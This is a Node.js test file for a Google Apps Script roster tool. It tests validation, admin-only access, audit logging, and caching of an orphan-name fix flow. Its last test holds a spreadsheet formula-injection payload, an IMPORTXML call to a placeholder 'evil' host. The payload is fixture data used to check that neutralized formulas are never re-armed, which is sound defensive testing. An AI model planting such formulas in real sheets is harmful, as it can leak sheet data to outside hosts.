'use strict';

const { test } = require('node:test');
const assert = require('node:assert/strict');
const { loadGas } = require('../harness/loadGas');
const { makeFakeSpreadsheet } = require('../harness/fakeSheet');
const { rosterGrid } = require('../harness/fixtures');

// addOrphanToRoster: the "orphan is actually a NEW EMPLOYEE" flow.
// The write must stay structurally confined to the chosen dept's
// column (first-blank-terminated header scan) and is INV-01-gated:
// admin + validation + lock + audit row.
const h = loadGas({
  files: ['Config.gs', 'Util.gs', 'Auth.gs', 'Data.gs', 'OrphanFix.gs'],
});

const LOG_HEADER = ['Timestamp', 'Admin', 'Action', 'From Name', 'To Name', 'Affected Rows', 'Notes'];

function install(opts) {
  opts = opts || {};
  h.state.userEmail = opts.email || 'admin@x.com';
  h.state.props.ADMIN_EMAILS = 'admin@x.com';
  h.state.props.SPREADSHEET_ID = 'fake';
  const sheets = {
    'DO NOT EDIT!': rosterGrid({
      Alpha: ['Anna, 201', 'Ben, 202'],
      Beta:  ['Cara, 301'],
    }),
    'Orphan Fix Log': [LOG_HEADER],
  };
  if (opts.noLog) delete sheets['Orphan Fix Log'];
  h.state.spreadsheet = makeFakeSpreadsheet({ timeZone: 'America/Chicago', sheets: sheets });
  h.state.cache.clear();
}

function add(req) { return h.call('addOrphanToRoster', req); }

test('roster-add: happy path appends "Name, exts" below the dept column', function () {
  install();
  const res = add({ name: 'Dana New', department: 'Beta', extensions: '305, 306' });
  assert.equal(res.added, 1);
  assert.equal(res.cell, 'G3');   // Beta = col G; below Cara (row 2)

  const grid = h.state.spreadsheet._sheet('DO NOT EDIT!')._data;
  assert.equal(grid[2][6], 'Dana New, 305, 306');
  // Alpha's column untouched.
  assert.equal(grid[1][5], 'Anna, 201');
  assert.equal((grid[2] || [])[5] || '', 'Ben, 202');

  // Audit row landed (action roster-add, dept in the To column).
  const log = h.state.spreadsheet._sheet('Orphan Fix Log')._data;
  assert.equal(log.length, 2);
  assert.equal(log[1][2], 'roster-add');
  assert.equal(log[1][3], 'Dana New');
  assert.equal(log[1][4], 'Beta');
  assert.ok(String(log[1][6]).indexOf('305, 306') !== -1, 'exts recorded in notes');

  // The new name is now on the roster -- a second add is rejected.
  assert.throws(function () {
    add({ name: 'Dana New', department: 'Alpha', extensions: '999' });
  }, /already on a roster/);
});

test('roster-add: longest column wins the row scan (per-column append)', function () {
  install();
  // Alpha has 2 entries, Beta has 1 -- adding to Alpha lands in row 4.
  const res = add({ name: 'Eve Q', department: 'Alpha', extensions: ['410'] });
  assert.equal(res.cell, 'F4');
  const grid = h.state.spreadsheet._sheet('DO NOT EDIT!')._data;
  assert.equal(grid[3][5], 'Eve Q, 410');
});

test('roster-add: validation rejects bad input before any write', function () {
  install();
  assert.throws(function () { add({ name: 'X Y', department: 'Alpha', extensions: '' }); },
    /extension is required/);
  assert.throws(function () { add({ name: 'X Y', department: 'Alpha', extensions: '20a' }); },
    /digits only/);
  assert.throws(function () { add({ name: 'X Y', department: 'Gamma', extensions: '200' }); },
    /Unknown department/);
  assert.throws(function () { add({ name: 'Anna', department: 'Alpha', extensions: '200' }); },
    /already on a roster/);
  assert.throws(function () { add({ name: 'A_Q_Ghost', department: 'Alpha', extensions: '200' }); },
    /Queue-sentinel/);
  assert.throws(function () { add({ name: 'Comma, Name', department: 'Alpha', extensions: '200' }); },
    /comma/);
  // Nothing was written by any rejected call.
  const grid = h.state.spreadsheet._sheet('DO NOT EDIT!')._data;
  assert.equal(grid.length, 3);
  assert.equal(h.state.spreadsheet._sheet('Orphan Fix Log')._data.length, 1);
});

test('roster-add: response carries refreshed rosterNames + log (Batch 1 5a seamless update)', function () {
  install();
  const res = add({ name: 'Dana New', department: 'Beta', extensions: '305' });
  // The client updates the open modal in place from these instead of re-fetching.
  assert.ok(Array.isArray(res.rosterNames), 'rosterNames array returned');
  assert.ok(res.rosterNames.indexOf('Dana New') !== -1, 'new name present in returned rosterNames');
  assert.ok(Array.isArray(res.log) && res.log.length >= 1, 'log array returned');
  assert.equal(res.log[0].action, 'roster-add');   // readOrphanFixLog_ is most-recent-first
  assert.equal(res.log[0].fromName, 'Dana New');
});

test('getOrphanFixInit caches the init blob; a write busts it (Batch 1 item 6)', function () {
  install();
  const first = h.call('getOrphanFixInit', null);
  assert.equal(first.rosterNames.indexOf('Zoe New'), -1);
  assert.ok(h.state.cache.has('orphanFix:init:v1'), 'init blob cached after first read');

  // A write busts the cache so a subsequent cold open recomputes.
  add({ name: 'Zoe New', department: 'Beta', extensions: '399' });
  assert.equal(h.state.cache.has('orphanFix:init:v1'), false, 'write busts the init cache');

  const second = h.call('getOrphanFixInit', null);
  assert.ok(second.rosterNames.indexOf('Zoe New') !== -1, 'fresh read reflects the write');
});

test('roster-add: admin-only; audit sheet is a precondition', function () {
  install({ email: 'manager@x.com' });
  assert.throws(function () {
    add({ name: 'X Y', department: 'Alpha', extensions: '200' });
  }, /admin-only/);

  install({ noLog: true });
  assert.throws(function () {
    add({ name: 'X Y', department: 'Alpha', extensions: '200' });
  }, /Orphan Fix Log sheet missing/);
});

// --- R8-3 (audit 2026-07-21): CORE-7 completion -- deactivate must not
// round-trip the whole block (getValues -> setValues re-arms neutralized
// formula cells: the leading apostrophe is FORMATTING, so the read returns
// the bare "=..." string and a block write re-interprets it as a live
// formula). Pin: deactivateAgentAlias_ writes ONLY the Active cell.
test('R8-3: deactivateAgentAlias_ writes only the Active cell (no whole-block setValues)', function () {
  install();
  const ALIAS_HEADER = ['Old Name', 'Canonical Name', 'Active', 'Added By', 'Added At', 'Notes'];
  h.state.spreadsheet = makeFakeSpreadsheet({ timeZone: 'America/Chicago', sheets: {
    'DO NOT EDIT!': rosterGrid({ Alpha: ['Anna, 201'] }),
    'Orphan Fix Log': [LOG_HEADER],
    'Agent Alias Overrides': [
      ALIAS_HEADER,
      // A CORE-7-neutralized formula-shaped orphan name in another ROW --
      // stored content is the bare string (the apostrophe is formatting).
      ['=IMPORTXML("http://evil","x")', 'Anna', 'TRUE', 'admin@x.com', '', ''],
      ['Old Bob', 'Anna', 'TRUE', 'admin@x.com', '', 'note'],
    ],
  } });
  const sheet = h.state.spreadsheet._sheet('Agent Alias Overrides');
  const writes = [];
  const realGetRange = sheet.getRange.bind(sheet);
  sheet.getRange = function (r, c, nr, nc) {
    const range = realGetRange(r, c, nr, nc);
    const realSetValues = range.setValues.bind(range);
    range.setValues = function (vals) {
      writes.push({ r, c, nr: nr || 1, nc: nc || 1, cells: vals.length * vals[0].length });
      return realSetValues(vals);
    };
    return range;
  };
  const count = h.call('deactivateAgentAlias_', 'Old Bob');
  assert.equal(count, 1);
  assert.equal(writes.length, 1, 'exactly one write');
  assert.deepEqual({ r: writes[0].r, c: writes[0].c, cells: writes[0].cells },
    { r: 3, c: 3, cells: 1 }, 'single-cell write at (row 3, Active col 3)');
  const grid = sheet._data;
  assert.equal(grid[2][2], 'FALSE', 'target row deactivated');
  assert.equal(grid[1][2], 'TRUE', 'other row untouched');
  assert.equal(grid[1][0], '=IMPORTXML("http://evil","x")',
    'formula-shaped cell content unchanged (and never re-written)');
});
